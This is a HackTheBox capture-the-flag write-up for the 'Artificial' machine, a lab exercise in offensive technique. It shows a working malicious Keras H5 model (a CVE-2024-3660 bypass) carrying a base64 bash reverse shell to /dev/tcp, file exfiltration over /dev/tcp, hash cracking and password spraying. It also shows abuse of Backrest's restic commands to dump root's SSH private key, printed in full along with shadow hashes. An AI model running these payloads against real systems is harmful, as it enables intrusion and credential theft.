---
render_with_liquid: false
title: HackTheBox Writeup - Artificial
date: 2025-06-27 03:31:36 +1400
tags: [hackthebox, nmap, linux, katana, python, tensorflow, ai, ai-model, h5, cve-2024-3660, deserialization, keras, discover-secrets, sqlite, hashcat, password-spraying, backrest, backup-solution, chepy, port-forwarding, file-read]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/e6633d6c2b1d824c3756eb21aeed7590.png
    width: 640
    height: 480
---



`Artificial` is an easy-difficulty Linux machine that showcases exploiting a web application used to run AI models with `Tensorflow` and the `Backrest` web UI by abusing the backup and restore functionalities and the `restic` utility used by the application.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ pt init '10.10.11.74 artificial.htb'
+------------+--------+-------------+----------------+
|  PROFILE   | STATUS |     IP      |     DOMAIN     |
+------------+--------+-------------+----------------+
| artificial | on     | 10.10.11.74 | artificial.htb |
+------------+--------+-------------+----------------+
```

## Nmap

```bash
# Nmap 7.95 scan initiated Fri Jun 27 03:31:34 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.10.11.74
Nmap scan report for 10.10.11.74
Host is up, received user-set (0.081s latency).
Scanned at 2025-06-27 03:31:36 CST for 9s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNABz8gRtjOqG4+jUCJb2NFlaw1auQlaXe1/+I+BhqrriREBnu476PNw6mFG9ifT57WWE/qvAZQFYRvPupReMJD4C3bE3fSLbXAoP03+7JrZkNmPRpVetRjUwP1acu7golA8MnPGzGa2UW38oK/TnkJDlZgRpQq/7DswCr38IPxvHNO/15iizgOETTTEU8pMtUm/ISNQfPcGLGc0x5hWxCPbu75OOOsPt2vA2qD4/sb9bDCOR57bAt4i+WEqp7Ri/act+f4k6vypm1sebNXeYaKapw+W83en2LnJOU0lsdhJiAPKaD/srZRZKOR0bsPcKOqLWQR/A6Yy3iRE8fcKXzfbhYbLUiXZzuUJoEMW33l8uHuAza57PdiMFnKqLQ6LBfwYs64Q3v8oAn5O7upCI/nDQ6raclTSigAKpPbliaL0HE/P7UhNacrGE7Gsk/FwADiXgEAseTn609wBnLzXyhLzLb4UVu9yFRWITkYQ6vq4ZqsiEnAsur/jt8WZY6MQ8=
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdlb8oU9PsHX8FEPY7DijTkQzsjeFKFf/xgsEav4qedwBUFzOetbfQNn3ZrQ9PMIHrguBG+cXlA2gtzK4NPohU=
|   256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH8QL1LMgQkZcpxuylBjhjosiCxcStKt8xOBU0TjCNmD
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://artificial.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 27 03:31:45 2025 -- 1 IP address (1 host up) scanned in 10.85 seconds
```


## 80 - HTTP : Artificial - AI Solutions


### Info

```ruby
http://artificial.htb [200] [Artificial - AI Solutions] [nginx/1.18.0 (Ubuntu)] [39d833132ea7128dce722e974caf17d699f6487c] [Nginx:1.18.0,Ubuntu]
```

![](/assets/obsidian/92c5a27b77634f8ac446597865c0a5fc.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ cat httpx/urls.txt | katana -d 5 -kf all -jc -jsl -silent -fx -j -o "katana.json" -srd "katana" | jq '{endpoint: .request.endpoint, tag: .request.tag, status_code: .response.status_code, length: .response.content_length, forms: (.response.forms // [])} | select((.tag != "link")) | [.status_code, .tag, .length, .endpoint, .forms.[]]' -c
[200,null,5442,"http://artificial.htb:80"]
[200,"a",952,"http://artificial.htb:80/register",{"method":"POST","action":"http://artificial.htb:80/register","enctype":"application/x-www-form-urlencoded","parameters":["username","email","password"]}]
[200,"script",999,"http://artificial.htb:80/static/js/scripts.js"]
[200,"a",857,"http://artificial.htb:80/login",{"method":"POST","action":"http://artificial.htb:80/login","enctype":"application/x-www-form-urlencoded","parameters":["email","password"]}]
[405,"js",153,"http://artificial.htb:80/upload_model"]
```


# User Flag
---

## Shell as app


### 80 - tensorflow 2.13.1 : Insecure lambda layer deserialization (CVE-2024-3660 Bypass)

Register an account on the platform to test its functions

> http://artificial.htb/register

![](/assets/obsidian/0c2bee68a5daf3cc0b47c06b5662f922.png)

We can upload AI models, it provids a Dockerfile and python `requirements.txt` for users

> http://artificial.htb/dashboard

![](/assets/obsidian/bba22ddf2ccd489c0330f73c497e7bdb.png)

The **Dockerfile** seems to be the environment that the target machine is using, which uses **tensorflow 2.13.1** and **python 3.8**

![](/assets/obsidian/16885988317a2c1cffc8e82db47eec57.png)

- Google : `tensorflow-cpu 2.13.1 exploit`

> https://www.oligo.security/blog/tensorflow-keras-downgrade-attack-cve-2024-3660-bypass

> **CVE-2024-3660**
> 
> A arbitrary code injection vulnerability in TensorFlow's Keras framework (<2.13) allows attackers to execute arbitrary code with the same permissions as the application using a model that allow arbitrary code irrespective of the application.
{: .prompt-info }

The blog mentioned that keras `load_module` function is vulnerable to **insecure lambda later deserialization**, which was fixed in TensorFlow Keras Framework >= 2.13 by implementing `safe_mode`

![](/assets/obsidian/11f84481fdc32ad2890cac02e76470f2.png)

![](/assets/obsidian/55eafd37b1ebe4c1aad7e41da5119e06.png)

But there's a bypass because **Keras** just ignores the `safe_mode` argument when running the old H5 format!

![](/assets/obsidian/cf7f2d384b0c9fbc8aff459e2fdc5786.png)

Let's build a docker image based on the **Dockerfile** from website

```bash
mkdir tensorflow-docker
cd tensorflow-docker
wget http://artificial.htb/static/Dockerfile
sudo docker build -t tensorflow .
```

![](/assets/obsidian/bf0d04d13f305914289279af6a10e6b5.png)

Create a docker container from the created image

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial/tensorflow-docker]
└─$ sudo docker run -v /tmp:/mnt/tmp -it tensorflow
root@80f857ea3caf:/code# python
Python 3.8.20 (default, Sep 27 2024, 06:05:23)
[GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
```

Create a malicious **keras** model and save to `poc.h5`

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("echo GG")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("poc.h5")
```

![](/assets/obsidian/38f85d57ecc54ffa67ebdb8a5f7df5d9.png)

Tried to load `poc.h5` to unmarshal the code, and it worked, which means it will likely work on the target machine too

```bash
>>> tf.keras.models.load_model("poc.h5")
GG
<keras.src.engine.sequential.Sequential object at 0x7fa094175ac0>
```

Generate a reverse shell payload for python's `os.system()` to run

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ echo "echo $(echo "bash -i >& /dev/tcp/10.10.14.153/1111 0>&1"|base64 -w0)|base64 -d|/bin/bash"
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTMvMTExMSAwPiYxCg==|base64 -d|/bin/bash
```

On the docker container, navigate to the mount point from host machine

```bash
>>> exit()
root@80f857ea3caf:/code# cd /mnt/tmp/
root@80f857ea3caf:/mnt/tmp# python
Python 3.8.20 (default, Sep 27 2024, 06:05:23)
[GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

Create a malicious **keras** model that returns a reverse shell

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTMvMTExMSAwPiYxCg==|base64 -d|/bin/bash")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exp.h5")
```

Listen for reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

Upload `/tmp/exp.h5` model to the website

![](/assets/obsidian/0a02a925f81cbd509e2cc76b857c8fa1.png)

![](/assets/obsidian/0ddb2fe0f21263f9d48fb3ec89d0fb1c.png)

After clicking on `View Predictions` button, the web APP loaded the malicious model

![](/assets/obsidian/8965fb02dd016e8b058ec5155a2888df.png)

We've got a shell as `app`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.153] from (UNKNOWN) [10.10.11.74] 38528
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
app@artificial:~/app$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
app@artificial:~/app$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
app@artificial:~/app$ stty rows 50 columns 209
app@artificial:~/app$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```


## From app to gael


### Crack user hashes from sqlite database

The web app is using a sqlite database located at `/home/app/app/instance/users.db`

```bash
app@artificial:~/app$ find -L ~/app/ -type f -exec ls -lahtr {} + 2>/dev/null
-rw-rw-r-- 1 app app  886 Oct 13  2024 /home/app/app/templates/login.html
-rw-rw-r-- 1 app app 1.3K Oct 13  2024 /home/app/app/templates/register.html
-rw-rw-r-- 1 app app  999 Oct 14  2024 /home/app/app/static/js/scripts.js
-rw-rw-r-- 1 app app 1.5K Oct 24  2024 /home/app/app/templates/run_model.html
-rw-rw-r-- 1 app app 6.5K Mar  8 01:31 /home/app/app/static/css/styles.css
-rw-rw-r-- 1 app app   23 Jun  6 14:36 /home/app/app/static/requirements.txt
-rw-rw-r-- 1 app app 7.7K Jun  9 13:54 /home/app/app/app.py
-rw-r--r-- 1 app app 7.0K Jun  9 13:55 /home/app/app/__pycache__/app.cpython-38.pyc
-rw-rw-r-- 1 app app  457 Jun  9 13:57 /home/app/app/static/Dockerfile
-rw-rw-r-- 1 app app 6.1K Jun  9 13:58 /home/app/app/templates/dashboard.html
-rw-rw-r-- 1 app app 5.4K Jun 18 13:20 /home/app/app/templates/index.html
-rw-r--r-- 1 app app 9.8K Jun 26 16:50 /home/app/app/models/6c365c95-7fd6-4568-9b23-91273126f364.h5
-rw-r--r-- 1 app app  24K Jun 26 16:50 /home/app/app/instance/users.db
```

Dump user hashes from the database

```bash
app@artificial:~/app$ sqlite3 /home/app/app/instance/users.db .dump
[...]
app@artificial:~/app$ sqlite3 /home/app/app/instance/users.db .dump | grep 'INSERT INTO user' | grep '@artificial.htb' | awk -F, '{print $3$4}' | awk -F"'" '{print $2":"$4}'
gael@artificial.htb:c99175974b6e192936d97224638a34f8
mark@artificial.htb:0f3d8c76530022670f1c6029eed09ccb
robert@artificial.htb:b606c5f5136170f15444251665638b36
royer@artificial.htb:bc25b1f80f544c0ab451c02a3dca9fc6
mary@artificial.htb:bf041041e57f1aff3be7ea1abd6129d0
n@artificial.htb:81dc9bdb52d04dc20036dbd8313ed055
```

Crack the hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ hashcat loot/users.db.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --user -m 900
hashcat (v6.2.6) starting

┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ hashcat loot/users.db.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --user -m 0
hashcat (v6.2.6) starting
[...]

┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ hashcat loot/users.db.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --user -m 0 --show
gael@artificial.htb:c99175974b6e192936d97224638a34f8:mattp005numbertwo
royer@artificial.htb:bc25b1f80f544c0ab451c02a3dca9fc6:marwinnarak043414036
n@artificial.htb:81dc9bdb52d04dc20036dbd8313ed055:1234
```


### Password spray

```bash
app@artificial:~/app$ PASS='mattp005numbertwo'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (x=$(echo $PASS | su "$USER" -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 93934
[2] 93935
[3] 93936
app@artificial:~/app$ Password: Password: Password: [+] gael
[...]

app@artificial:~/app$ PASS='marwinnarak043414036'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (x=$(echo $PASS | su "$USER" -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 93968
[2] 93969
[3] 93970
app@artificial:~/app$ Password: Password: Password:
```

```bash
app@artificial:~/app$ su - gael
Password:mattp005numbertwo
gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
gael@artificial:~$ cat ~/user.txt
8cd46646d424ba5aca4416a0ecde2e91
```


# Root Flag
---

## From gael to root


### sysadm group

Check what `sysadm` owns

```bash
gael@artificial:~$ find / -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -group sysadm -ls 2>/dev/null
   293066  51132 -rw-r-----   1 root     sysadm   52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz
```

Transfer the file to our host

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ nc -lvnp 53 > loot/backrest_backup.tar.gz
listening on [any] 53 ...
```

```bash
gael@artificial:~$ cat /var/backups/backrest_backup.tar.gz > /dev/tcp/10.10.14.153/53
```

`backrest_backup.tar.gz` contains interesting files such as configs and jwt secret

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ 7z l loot/backrest_backup.tar.gz
[...]

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-03-05 06:17:53 D....            0            0  backrest
2025-03-03 12:28:26 .....     26501272     26501632  backrest/restic
2025-03-05 06:17:53 .....            0            0  backrest/oplog.sqlite-wal
2025-03-05 06:17:53 .....        32768        32768  backrest/oplog.sqlite-shm
2025-03-04 05:27:17 D....            0            0  backrest/.config
2025-03-05 06:17:42 D....            0            0  backrest/.config/backrest
2025-03-05 06:17:42 .....          280          512  backrest/.config/backrest/config.json
2025-03-04 05:18:52 .....            0            0  backrest/oplog.sqlite.lock
2025-02-17 03:38:14 .....     25690264     25690624  backrest/backrest
2025-03-05 06:17:53 D....            0            0  backrest/tasklogs
2025-03-05 06:17:53 .....        32768        32768  backrest/tasklogs/logs.sqlite-shm
2025-03-04 05:18:52 D....            0            0  backrest/tasklogs/.inprogress
2025-03-05 06:17:53 .....            0            0  backrest/tasklogs/logs.sqlite-wal
2025-03-05 06:13:00 .....        24576        24576  backrest/tasklogs/logs.sqlite
2025-03-05 06:13:00 .....        57344        57344  backrest/oplog.sqlite
2025-03-04 05:18:53 .....           64          512  backrest/jwt-secret
2025-03-04 05:18:52 D....            0            0  backrest/processlogs
2025-03-05 06:17:54 .....         2122         2560  backrest/processlogs/backrest.log
2025-03-03 12:28:57 .....         3025         3072  backrest/install.sh
------------------- ----- ------------ ------------  ------------------------
2025-03-05 06:17:54           52344483     52346368  13 files, 6 folders
```

It was actually just a `tar archive` instead of gziping, lets extract it

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ file loot/backrest_backup.tar.gz
loot/backrest_backup.tar.gz: POSIX tar archive (GNU)

┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ tar -xf loot/backrest_backup.tar.gz -C loot/
```

### Backrest 1.7.2 - Crack user's hash

From `install.sh`, we know that **backrest** is a web app listening on `http://localhost:9898`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ cat loot/backrest/install.sh
[...]
echo "Logs are available at ~/.local/share/backrest/processlogs/backrest.log"
echo "Access backrest WebUI at http://localhost:9898"
```

From logs file, we've obtained the version info of **backrest**, which is `1.7.2`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ cat loot/backrest/processlogs/backrest.log
{"level":"warn","ts":1741126673.1377373,"msg":"attempting graceful shutdown, to force termination press Ctrl+C again"}
{"level":"info","ts":1741126673.1378818,"msg":"HTTP gateway shutdown"}
{"level":"info","ts":1741126673.1379092,"msg":"shutting down orchestrator loop, context cancelled."}
{"level":"info","ts":1741126673.156254,"msg":"backrest version 1.7.2@b885f1ec9e43e4bfe8f4f6f02bda83f5e7d88574, using log directory: /opt/backrest/processlogs"}
[...]
```

We didn't find anything by googling `backrest 1.7.2 exploit`, but we got its github repo and acknowledged it's a lightweight backup solution

> https://github.com/garethgeorge/backrest

![](/assets/obsidian/cda26cbe703fe6ba36aadcd2daf1bb48.png)

There's a user `backrest_root` and `passwordBcrypt` with a value that looks like base64 encoded string

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ cat loot/backrest/.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

> How to Install [chepy](https://github.com/securisec/chepy) (a python lib/cli equivalent of the awesome CyberChef tool)
> 
> ```bash
> uv tool install chepy[extras] --p 3.11
> ```
{: .prompt-info }

Decode `passwordBcrypt` from baseXX and found base64 decoded string to be a **bcrypt** hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ chepy 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP'
>>> bruteforce_from_base_xx
{'base85': None, 'base16': None, 'base32': None, 'base64': b'$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO', 'base58': None}
>>>
```

Crack the hash

```bash
 echo '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' > loot/backrest_root.hash
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ hashcat loot/backrest_root.hash /opt/wordlists/rockyou.txt -m 3200
hashcat (v6.2.6) starting
[...]

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
```


### Backrest 1.7.2 - Dump root's ssh private key

Local port forward `9898` to access **Backrest** web application

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ ssh gael@artificial.htb -L 9898:127.0.0.1:9898 -N
Warning: Permanently added 'artificial.htb' (ED25519) to the list of known hosts.
gael@artificial.htb's password:
Last login: Thu Jun 26 17:29:36 2025 from 10.10.14.153
```

> http://127.0.0.1:9898/

Login with `backrest_root:!@#$%^`

![](/assets/obsidian/adf72555bb53a1f13ec2eeb09ba4e368.png)

![](/assets/obsidian/2b93a0560d0d1712da885bdc070872d5.png)

Based on the [user guide](), we should create a repository first

![](/assets/obsidian/a68014efa6892da2c2402e2df1fbb693.png)

Fill up 3 fields: `Repo Name`, `Repository URI`, `Add Restic Repository` and submit the form

![](/assets/obsidian/39b57a87c527f9dbea948eee09524c9f.png)

**Run Command** button looks really interesting

![](/assets/obsidian/acce8938309f5a62d407e3cac1b82d56.png)

![](/assets/obsidian/91eaadd43682986ab53271fabe3ca5ae.png)

The function runs `/opt/baclrest/restic` CLI tool to perform backup related operations, we can abuse `backup` and `dump` commands to attempt backup and view `root`'s ssh private key

![](/assets/obsidian/fc78b5ccbc5478bd474b644823c9b140.png)

Check `backup` command usage

![](/assets/obsidian/20a121730d5b9bd4974781fb001f5a46.png)

Backup `root`'s ssh private key

```bash
backup /root/.ssh
```

![](/assets/obsidian/ffcdcf30630d794698bba610b708c221.png)

By browsing the snapshot, we made sure that `id_rsa` was included

![](/assets/obsidian/23f1127a6ebf89f78cb7ddb093a7f328.png)

Check `dump` command's usage

![](/assets/obsidian/d7ce618f2465dba6f4795b53ac7d0e80.png)

Dump `root`'s ssh private key from the snapshot

```bash
dump 63599294 /root/.ssh/id_rsa
```

![](/assets/obsidian/d2b003a3bb1e582c16e8d276b1fe4f86.png)

Save the private key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ vi loot/root.id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----

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

-----END OPENSSH PRIVATE KEY-----
```

Remove empty lines from `loot/root.id_rsa` to fit ssh private key's format

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ sed -i '/^[[:space:]]*$/d' loot/root.id_rsa
```

SSH as `root` via ssh private key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Artificial]
└─$ ssh -i loot/root.id_rsa root@artificial.htb
Warning: Permanently added 'artificial.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
[...]
root@artificial:~# id
uid=0(root) gid=0(root) groups=0(root)
root@artificial:~# cat root.txt
bf453e6c1317f5fc5bdb575fc4eebdc7
```


# Additional
---

## Post exploitation


### Secrets

```bash
root@artificial:~# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$6$UUrrHE6LTPdhmLil$v9nJaHljuUC0gR5HBAqVWvnDVgYoNYE6EvjIEGNykwadZ8w8gOu212j5bipzK72.nBtx/0h4z4CPki/Ac2f1i1:20015:0:99999:7:::
gael:$6$ZgkOwXDgoK.yOfv9$7gGQcVFbMepHAPCW.qS/1z87V5p15x4RokWKwNvFXqwo3QLEfFx2GaJs1JqbZ81i/uLy7bJ8TYk4dQYXQpeEC0:20015:0:99999:7:::
app:$6$1CKnP41b8QhfYnAx$b88.zZJfVQ84SBkePAyzIsXdA/w6wvUVq4c2ExOho0RIY8iS43bdJbBPHYdttqqNvBV.H6noc2EFkdBlbb5WL.:20015:0:99999:7:::
```


### Files

```bash
root@artificial:~# cat scripts/cleanup.sh
#!/bin/bash
rm -r /dev/shm/*
shopt -s extglob
rm -r /tmp/!(systemd*)
rm -r /home/*/!(.bash_logout|.bashrc|user.txt|.ssh|.profile|.bash_history|.python_history|.sqlite_history|app)
rm -r /home/app/app/!(app.py|instance|models|__pycache__|static|templates)
rm -r /home/app/app/instance/!(users.db)
rm -r /home/app/app/static/!(css|js|requirements.txt|Dockerfile)
rm -r /home/app/app/static/css/!(styles.css)
rm -r /home/app/app/static/js/!(scripts.js)
rm -r /root/.ssh/!(id_rsa|authorized_keys)
rm -r /root/!(root.txt|scripts)
rm -r /home/app/app/templates/!(dashboard.html|index.html|login.html|register.html|run_model.html|sales_statistics.html)
shopt -u extglob
rm -r /home/app/app/models/*
rm -r /opt/backrest/.config/backrest/*
cp /root/scripts/config.json /opt/backrest/.config/backrest/config.json
chmod 600 /opt/backrest/.config/backrest/config.json
truncate -s 0 /opt/backrest/processlogs/backrest.log
sqlite3 /opt/backrest/oplog.sqlite 'delete from operations; delete from operation_groups'
/usr/sbin/service backrest restart
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```